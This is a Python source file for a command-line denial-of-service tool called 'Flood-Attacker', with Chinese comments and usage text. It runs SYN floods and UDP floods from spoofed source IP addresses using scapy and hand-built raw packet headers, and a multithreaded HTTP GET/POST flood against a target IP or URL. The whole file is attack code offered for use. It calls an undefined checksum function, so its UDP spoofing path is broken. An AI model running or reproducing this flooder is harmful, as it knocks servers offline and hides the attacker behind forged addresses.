import logging
from urllib.parse import urlparse
import pyfiglet
import sys,struct
import socket
import time,requests
from scapy.all import *
import sys
tips = """
参数解释：
       -ip/url  : 指定需要攻击的服务器的IP地址或网站url(HTTP)
       -fip     : 伪造的IP地址,多个使用","隔开
       -port    : 指定攻击的端口号,默认80
       -size    : 指定发送的SYN数据包的大小,默认为100
       -time    : 指定发送的时间间隔,默认为0.1s
       -type    : 指定攻击类型,UDP TCP HTTP
       -duration: 指定攻击的持续时间,默认为10s
       -method[*] : HTTP攻击类型选择 GET,POST
       -thread    : 指定HTTP 攻击的线程数,默认为10
       -payload   : 指定post的载荷
"""
usage = """
Usage:
python flood_attack.py -ip/url <target_ip> -type <UDP,TCP,HTTP> [-method <GET,POST>] [-fip <fake_ip1,fake_ip2,...>] [-port <target_port>] [-size <payload_size>] [-time <interval>] [-duration <consist time>]

-----------------------------------输出显示-----------------------------------
"""

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(threadName)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
def fro():
  print('<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
  # fonts = ["ansi_shadow","ansi_regular","avatar","banner3-D","bear","big","big_money-ne","big_money-nw","blocky","braced","univers","small_slant","doom","dos_rebel"]
  text = "Flood-Attacker"
  print(pyfiglet.figlet_format(text, font="big"),end='')
  print('#'+'公众号:【Yuthon】'+'\n'+'  ~~~路漫漫其修远兮,吾将上下而求索~~~')
  print('<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'+'\n'+tips+usage)

def parse_arguments():
  options = {
    "ip": None,
    "fip": None,
    "port": 80,
    "size": 100,
    "time": 0.1,
    'duration': 10,
    'thread':10,
    'method':None
  }
  args = sys.argv[1:]  # 获取除脚本名之外的参数
  fro()
  if len(args) == 0:
    sys.exit(1)
  else:
    if '-ip' not in args or '-type' not in args:
      print('错误: 目标服务器 -ip 或 攻击类型 -type 未指定')
      sys.exit(1)
    try:
      # 提取参数值
      if '-ip' in args:
        options["ip"] = args[args.index('-ip') + 1]
      if '-type' in args:
        options['type'] = args[args.index('-type') + 1]
      if '-fip' in args:
        options["fip"] = args[args.index('-fip') + 1].split(',')
      if '-port' in args:
        options["port"] = int(args[args.index('-port') + 1])
      if '-size' in args:
        options["size"] = int(args[args.index('-size') + 1])
      if '-time' in args:
        options["time"] = float(args[args.index('-time') + 1])
      if '-duration' in args:
        options["duration"] = float(args[args.index('-duration') + 1])
      if '-method' in args:
        options["method"] = args[args.index('-method') + 1]
      if '-payload' in args:
        options["payload"] = args[args.index('-payload') + 1]
    except (ValueError, IndexError):
      print("错误: 不合法的输入或空输入")
      sys.exit(1)
    return options

def TCP_attack(options: dict):
  srcList = options['fip']
  count = 0
  print('开始进行TCP数据包发送...'+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
  end_time = time.time() + options['duration']
  while time.time() < end_time:
    sPort = random.randint(1024, 65535)
    for index, spoof_ip in enumerate(srcList):
      count+=1
      ipLayer = IP(src=spoof_ip, dst=options['ip'])  # 伪造IP层
      tcpLayer = TCP(sport=sPort, dport=options['port'], flags="S")  # 伪造TCP层 SYN（IP/TCP）的标志符
      payload_size = Raw(b'X' * options['size'])
      packet = ipLayer / tcpLayer / payload_size
      time.sleep(options['time'])
      send(packet,verbose=False)
      if count % 20 == 0:
        print(f'[+]已成功发送{count}个数据包 '+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
  print('攻击结束...'+'持续时间'+str(options['duration'])+'s '+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))

def build_ip_header(src_ip, dest_ip):
    """
    构造 IP 头
    """
    version = 4
    ihl = 5  # Header length
    tos = 0  # Type of service
    tot_len = 20 + 8  # IP Header + UDP Header
    id = random.randint(0, 65535)  # Packet ID
    frag_off = 0
    ttl = 64
    protocol = socket.IPPROTO_UDP
    check = 0  # Will calculate later
    src = socket.inet_aton(src_ip)
    dest = socket.inet_aton(dest_ip)

    ver_ihl = (version << 4) + ihl
    ip_header = struct.pack('!BBHHHBBH4s4s', ver_ihl, tos, tot_len, id, frag_off, ttl, protocol, check, src, dest)
    check = checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s', ver_ihl, tos, tot_len, id, frag_off, ttl, protocol, socket.htons(check),
                            src, dest)
    return ip_header
def build_udp_header(src_ip, dest_ip, src_port, dest_port, payload):
  """
  构造 UDP 头
  """
  length = 8 + len(payload)
  checksum_placeholder = 0

  # UDP Header
  udp_header = struct.pack('!HHHH', src_port, dest_port, length, checksum_placeholder)

  # Pseudo Header
  pseudo_header = struct.pack('!4s4sBBH', socket.inet_aton(src_ip), socket.inet_aton(dest_ip), 0, socket.IPPROTO_UDP,
                              length)
  pseudo_packet = pseudo_header + udp_header + payload

  udp_checksum = checksum(pseudo_packet)
  udp_header = struct.pack('!HHHH', src_port, dest_port, length, udp_checksum)
  return udp_header
def UDP_attack(options: dict):
  #参数赋值
  target_ip = options['ip']
  target_port = options['port']
  fip_list = options['fip']
  duration = options['duration']
  size = options['size']

  # print('UDP_attack')
  payload = random._urandom(size)
  raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

  print(f"正在对 {target_ip}:{target_port} 发起 UDP Flood 攻击，持续 {duration} 秒..."+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
  if fip_list:
    print(f"伪造源 IP: {', '.join(fip_list)}")
  else:
    pass

  end_time = time.time() + duration
  packets_sent = 0
  try:
    while time.time() < end_time:
      # 随机选择一个伪造的源 IP
      if fip_list:
        fake_ip = random.choice(fip_list)
      else:
        fake_ip = None
      src_port = random.randint(1024, 65535)  # 随机源端口

      # 构造 IP 和 UDP 头
      if fake_ip:
        ip_header = build_ip_header(fake_ip, target_ip)
        udp_header = build_udp_header(fake_ip, target_ip, src_port, target_port, payload)
        packet = ip_header + udp_header + payload
      else:
        packet = payload

      # 发送伪造数据包
      raw_socket.sendto(packet, (target_ip, target_port))
      packets_sent += 1
      time.sleep(options['time'])
      if packets_sent % 1500 == 0:
        print(f"[+] 已发送 {packets_sent} 个数据包 [伪造IP: {fake_ip}] "+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
  except KeyboardInterrupt:
    print("\n攻击被手动停止")
  except Exception as e:
    print(f"[!] 发生错误: {e}")
  finally:
    raw_socket.close()
    print(f"\n攻击结束，共发送了 {packets_sent} 个数据包"+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))

def send_get_request(url):
    try:
      response = requests.get(url, timeout=5)
      logging.info(f"[GET] {url} -> Status: {response.status_code}")
    except Exception as e:
      logging.info(f"[GET] Error: {e}")
def send_post_request(url, payload):
  try:
    response = requests.post(url, data=payload, timeout=5)
    logging.info(f"[POST] {url} -> Status: {response.status_code}")
  except Exception as e:
    logging.info(f"[POST] Error: {e}")
def HTTP_attack(options: dict):
  """
  发起 HTTP 攻击
  """
  # 校验输入参数
  if 'http' not in options['ip']:
    print("[Error] URL 格式不正确，应包含 'http://'")
    return

  if 'method' not in options or options['method'] not in ["GET", "POST"]:
    print("[Error] 未指定有效的 HTTP 方法，支持 GET 或 POST")
    return

  if options['method'] == "POST" and 'payload' not in options:
    print("[Error] POST 方法需要指定 payload")
    return

  # 拼接目标 URL
  if options['port'] != 80:
    target_url = f"http://{options['ip']}:{options['port']}"
  else:
    target_url = options['ip']

  # 检查 URL 是否合法
  try:
    parsed_url = urlparse(target_url)
    # 检查 URL 是否包含协议（http/https）
    if not parsed_url.scheme:
      print("[Error] URL 缺少协议 (http:// 或 https://)")
      return False
    # 检查是否包含主机名或 IP
    if not parsed_url.netloc:
      print("[Error] URL 缺少主机名或 IP 地址")
      return False
    # 如果解析成功且格式正确，返回 True
  except Exception as e:
    print(f"[Error] 无法解析 URL: {e}")
    return False

  # 设置攻击时间
  end_time = time.time() + options['duration']
  threads = []

  print(f"开始 HTTP 攻击，目标: {target_url}, 方法: {options['method']}, 持续: {options['duration']} 秒")

  try:
    while time.time() < end_time:
      if options['method'] == "GET":
        for _ in range(options['thread']):
          t = threading.Thread(target=send_get_request, args=(target_url,))
          t.start()
          threads.append(t)
      elif options['method'] == "POST":
        for _ in range(options['thread']):
          t = threading.Thread(target=send_post_request, args=(target_url, options['payload']))
          t.start()
          threads.append(t)

  except KeyboardInterrupt:
    print("\n攻击被手动终止")
  finally:
    # 等待所有线程结束
    for t in threads:
      if t.is_alive():
        t.join()  # 确保主线程等待所有子线程完成
    print("HTTP 攻击结束..."+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))


def attack(options: dict):
  if options['type'] == 'TCP':
    TCP_attack(options)
  elif options['type'] == 'UDP':
    UDP_attack(options)
  elif options['type'] == 'HTTP':
    HTTP_attack(options)
  else:
    print('攻击类型不合法，请重新输入')
    sys.exit(1)

if __name__ == '__main__':
  options = parse_arguments()
  attack(options)
